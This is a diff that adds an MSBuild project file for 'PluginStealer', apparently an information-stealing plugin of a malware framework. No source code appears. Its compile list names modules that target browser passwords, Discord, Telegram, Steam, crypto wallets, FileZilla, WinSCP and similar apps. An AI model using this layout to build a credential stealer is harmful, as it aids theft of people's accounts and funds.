@@ -1,0 +1,85 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{39B7CF27-D06F-4D29-84CE-DBE03CAE09D4}</ProjectGuid>
+    <OutputType>Library</OutputType>
+    <AssemblyName>PluginStealer</AssemblyName>
+    <TargetFrameworkVersion>v4.8</TargetFrameworkVersion>
+    <ApplicationVersion>1.0.0.0</ApplicationVersion>
+    <FileAlignment>512</FileAlignment>
+    <RootNamespace>Plugin</RootNamespace>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>none</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>..\bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Security" />
+    <Reference Include="System.Web.Extensions" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Plugin.cs" />
+    <Compile Include="MessageHandlers\PluginStealerHandler.cs" />
+    <Compile Include="Helper\Stealer\Apps.cs" />
+    <Compile Include="Helper\Stealer\Crypto.cs" />
+    <Compile Include="Helper\Stealer\Discord.cs" />
+    <Compile Include="Helper\Stealer\FileZilla.cs" />
+    <Compile Include="Helper\Stealer\FoxMail.cs" />
+    <Compile Include="Helper\Stealer\Ngrok.cs" />
+    <Compile Include="Helper\Stealer\OBS.cs" />
+    <Compile Include="Helper\Stealer\Steam.cs" />
+    <Compile Include="Helper\Stealer\Telegram.cs" />
+    <Compile Include="Helper\Stealer\WinScp.cs" />
+    <Compile Include="Helper\Stealer\Chromium.cs" />
+    <Compile Include="Helper\Stealer\Gecko.cs" />
+    <Compile Include="Helper\Stealer\Configuration.cs" />
+    <Compile Include="Helper\Stealer\ChromeDecryptor.cs" />
+    <Compile Include="Helper\Stealer\GeckoDecryptor.cs" />
+    <Compile Include="Helper\Stealer\PasswordBasedDecryption.cs" />
+    <Compile Include="Helper\Stealer\PBKDF2.cs" />
+    <Compile Include="Helper\Stealer\TripleDES.cs" />
+    <Compile Include="Helper\Stealer\BCryptInternalStructs.cs" />
+    <Compile Include="Helper\Stealer\InternalStructs.cs" />
+    <Compile Include="Helper\Stealer\BCryptNativeMethods.cs" />
+    <Compile Include="Helper\Stealer\NativeMethods.cs" />
+    <Compile Include="Helper\Stealer\ASN1DER.cs" />
+    <Compile Include="Helper\Stealer\BerkelyParser.cs" />
+    <Compile Include="Helper\Stealer\SqlLite3Parser.cs" />
+    <Compile Include="Helper\Stealer\AesGcm.cs" />
+    <Compile Include="Helper\Stealer\Utils.cs" />
+    <Compile Include="AssemblyInfo.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <ProjectReference Include="..\InvokedCommon\InvokedCommon.csproj">
+      <Project>{467046a7-a9ca-439d-bcf4-10ce2913ea5f}</Project>
+      <Name>InvokedCommon</Name>
+    </ProjectReference>
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+  <PropertyGroup>
+    <PostBuildEvent>if not exist "$(TargetDir)Plugins\" mkdir "$(TargetDir)Plugins"
+move /Y "$(TargetPath)" "$(TargetDir)Plugins\"
+</PostBuildEvent>
+  </PropertyGroup>
+</Project>
